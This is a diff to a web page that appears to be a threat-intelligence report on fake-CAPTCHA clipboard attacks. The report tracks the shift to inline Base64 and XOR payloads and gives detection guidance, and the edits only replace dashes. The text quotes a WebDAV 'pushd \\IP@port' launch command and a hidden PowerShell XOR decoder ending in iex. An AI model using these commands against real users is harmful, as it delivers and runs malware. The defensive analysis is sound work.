@@ -288,7 +288,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 </div>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>May 2026: 95.2% of domains now carry inline payloads.</strong> Up from 75% in April and 47% in March, the no-URL rate has hit a new high. Base64 accounts for 87% of May domains (399/458). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update — no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
+  <strong>May 2026: 95.2% of domains now carry inline payloads.</strong> Up from 75% in April and 47% in March, the no-URL rate has hit a new high. Base64 accounts for 87% of May domains (399/458). A new delivery variant also appeared: <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> mounts a WebDAV share and launches a binary impersonating Google Update - no PowerShell, no HTTP fetch, no URL in the clipboard command at all. Your T1105 network-fetch detection never fires. The behavioral chokepoint that does fire: unusual parent process spawning <code>conhost.exe</code> or <code>cmd.exe</code> with a UNC path argument.
 </div>
 
 <!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
@@ -352,7 +352,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 <h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
 <p>Here's the finding that changes the detection calculus: <strong>95% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
 
-<p>Base64 now accounts for 87% of May domains (399/458) — it's not one technique among several, it's the default. Two other techniques appear in smaller numbers: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), and a newer <strong>WebDAV delivery</strong> variant using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> — no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
+<p>Base64 now accounts for 87% of May domains (399/458) - it's not one technique among several, it's the default. Two other techniques appear in smaller numbers: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), and a newer <strong>WebDAV delivery</strong> variant using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
 $b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
@@ -408,9 +408,9 @@ iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
       </td>
       <td style="color:var(--text-muted);font-family:inherit;font-size:.8rem;">
         {% if d.cdn %}Domain reputation blocklists ineffective (legitimate CDN provider)
-        {% elsif d.hosting_type == "bulletproof" %}Abuse-tolerant VPS — takedown requests ignored; block by ASN or IP range
-        {% elsif d.hosting_type == "compromised" %}Legitimate site used as payload host — blocking harms the victim domain
-        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting — blocklist removes legitimate sites
+        {% elsif d.hosting_type == "bulletproof" %}Abuse-tolerant VPS - takedown requests ignored; block by ASN or IP range
+        {% elsif d.hosting_type == "compromised" %}Legitimate site used as payload host - blocking harms the victim domain
+        {% elsif d.domain contains "wpengine.com" %}Managed WP hosting - blocklist removes legitimate sites
         {% elsif d.domain contains "blogspot.com" or d.domain contains "blogger.com" %}Google-hosted; domain blocking would block all of Blogger
         {% else %}-{% endif %}
       </td>
